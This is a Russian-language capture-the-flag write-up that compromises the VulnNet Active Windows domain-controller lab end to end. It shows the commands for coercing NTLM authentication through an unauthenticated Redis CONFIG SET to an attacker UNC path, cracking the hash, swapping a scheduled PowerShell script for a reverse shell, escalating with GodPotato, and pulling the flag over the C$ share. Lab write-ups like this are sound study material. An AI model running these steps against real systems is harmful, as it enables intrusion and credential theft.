Уязвимая машина: VulnNet Active (Write-up)
ОС: Windows Server 2019
Уровень: Medium / Hard
Векторы: Unauthenticated Redis, NTLM Hash Stealing (Responder), Scheduled Task Hijacking, SeImpersonatePrivilege (GodPotato).

Введение
VulnNet Active — это отличный симулятор контроллера домена Active Directory. В этом райтапе мы разберем, как захватить сервер через неаутентифицированный Redis, почему не стоит верить консольным ошибкам, как проверять службы перед запуском LPE-эксплойтов и почему старый добрый smbclient иногда работает лучше, чем сложные фреймворки.

1. Разведка (Reconnaissance)
Сканирование портов (RustScan / Nmap):

*.bash
Shell
rustscan -a 10.49.156.78 -- -sV -sC -A
Интересные находки:

464 (kpasswd5), 9389 (mc-nmf) — Маркеры контроллера домена Active Directory.
6379 (redis) — Аномалия. In-Memory БД Redis, версия 2.8.2402, работающая под Windows.
Анонимный доступ по SMB запрещен (enum4linux-ng вернул STATUS_LOGON_FAILURE), поэтому мы переключаем внимание на Redis.

2. Первоначальный доступ: Атака на Redis
Подключаемся к порту 6379. База пускает нас без пароля. Вывод команды info подтверждает, что это Windows-версия.

💡 Справка по Redis: Как работает RCE через конфигурацию
В старых версиях Redis злоумышленник может менять конфигурацию "на лету".

CONFIG SET dir "<путь>" — меняет рабочую директорию сервера (куда он сохраняет бэкапы).
CONFIG SET dbfilename "<имя_файла>" — задает имя файла бэкапа (например, shell.php или payload.bat).
SAVE — принудительно сбрасывает базу данных из оперативной памяти на жесткий диск по указанному пути.
Прямая запись файлов на диск (Arbitrary File Write) здесь не дает мгновенного RCE, так как на сервере нет веб-сервера (80/443 порты закрыты). Мы используем другой вектор: принудительную NTLM-аутентификацию.

Ловушка для NTLMv2
В среде Windows, если заставить службу обратиться к сетевой папке (UNC-пути), ОС попытается авторизоваться на ней, передав хэш пароля учетной записи службы.

Запускаем Responder на Kali:
*.bash
Shell
sudo responder -I tun0 -dwv
В консоли Redis заставляем сервер обратиться к нашему IP-адресу:
*.txt
Plaintext
10.49.156.78:6379> CONFIG SET dir "//192.168.156.81/share"
(error) ERR Changing directory: Permission denied
🧠 Анатомия взлома: Почему ошибка — это успех?
Несмотря на то, что консоль Redis выдала ошибку Permission denied, в этот самый момент Responder успешно перехватил NTLMv2-хэш пользователя enterprise-security!

Почему так произошло? Когда Windows пытается открыть UNC-путь \\192.168.156.81\share, она сначала инициирует соединение по порту 445. Responder отвечает на запрос и требует аутентификацию. Windows послушно отдает хэш (рукопожатие завершено). Однако Responder — это фейковый сервер, на нем нет реальной папки share. Поэтому, передав хэш, Windows понимает, что нужной папки не существует, и возвращает ошибку API операционной системы. Redis ловит эту ошибку и транслирует её нам как Permission denied.
Урок: В пентесте никогда не верьте ошибкам на экране. Всегда проверяйте свои листнеры.
Забираем хэш из Responder, скармливаем его Hashcat (hashcat -m 5600) и получаем пароль: sand_0873959498.

3. Закрепление: Эксплуатация планировщика задач
Имея учетные данные, проверяем доступные SMB-шары:

*.bash
Shell
smbmap -H 10.49.156.78 -u "enterprise-security" -p 'sand_0873959498'
У нас есть права READ, WRITE на шару Enterprise-Share. Внутри лежит PowerShell-скрипт PurgeIrrelevantData_1826.ps1. Очевидно, что это скрипт очистки, который регулярно запускается планировщиком задач (Scheduled Task).

Генерируем свой PowerShell Reverse Shell с таким же именем, запускаем nc -lvnp 4444 и подменяем оригинальный файл через smbclient:

*.txt
Plaintext
smb: \> lcd /home/olya/tools/
smb: \> put PurgeIrrelevantData_1826.ps1
Планировщик срабатывает, и мы получаем Shell!

4. Повышение привилегий (Privilege Escalation)
Проверяем привилегии пользователя в полученном шелле:

*.ps
PowerShell
PS C:\> whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
Наличие SeImpersonatePrivilege — это 100% путь к правам SYSTEM через уязвимости семейства Potato.

❌ Кроличья нора: Мертвый PrintSpoofer
Классическим выбором для Server 2019 является эксплойт PrintSpoofer64.exe. Мы загружаем его на сервер, но команда .\PrintSpoofer64.exe -i -c cmd не дает вывода.
Попытка использовать "слепое" выполнение с перенаправлением в файл (-c "cmd /c whoami > whoami.txt") тоже проваливается — файл не создается. Эксплойт не работает вообще.

В чем причина? Проверяем службы!
PrintSpoofer использует для своей работы диспетчер печати. В современных и запатченных системах (особенно после уязвимостей PrintNightmare) админы часто его отключают. Проверим это:

*.ps
PowerShell
PS C:\> Get-Service Spooler
Status   Name               DisplayName
------   ----               -----------
Stopped  Spooler            Print Spooler
Служба остановлена. PrintSpoofer здесь бесполезен.

✅ Успешный вектор: GodPotato
Переключаемся на современный аналог — GodPotato (работает через DCOM и не зависит от Spooler'a). Скачиваем GodPotato-NET4.exe (в Server 2019 по умолчанию стоит .NET 4).

Используем эксплойт не для запуска кривого шелла, а для прямого изменения конфигурации ОС — добавим нашего юзера в группу локальных администраторов:

*.ps
PowerShell
.\GodPotato-NET4.exe -cmd "net localgroup Administrators enterprise-security /add"
Команда успешно выполнена. Пользователь enterprise-security теперь обладает полными правами.

5. Сбор флагов (Post-Exploitation)
Будучи администраторами, мы можем использовать инструменты из набора Impacket (psexec.py или wmiexec.py) для получения системной консоли по SMB.

Однако, если в вашей Kali Linux сломано виртуальное окружение Python (ошибка No such file or directory при запуске Impacket), есть путь гораздо быстрее.

Добавление в группу Administrators открывает нашему пользователю доступ к скрытой административной шаре C$ (доступ ко всему диску C:\ по сети). Нам даже не нужен системный шелл, чтобы забрать флаг! Идем напрямую через smbclient:

*.bash
Shell
smbclient //10.49.172.137/C$ -U "vulnnet.local\enterprise-security%sand_0873959498"
Успешный логин! Переходим в директорию администратора и забираем флаг:

*.txt
Plaintext
smb: \> cd Users\Administrator\Desktop
smb: \> get root.txt
Машина пройдена (Pwned)! 🚩

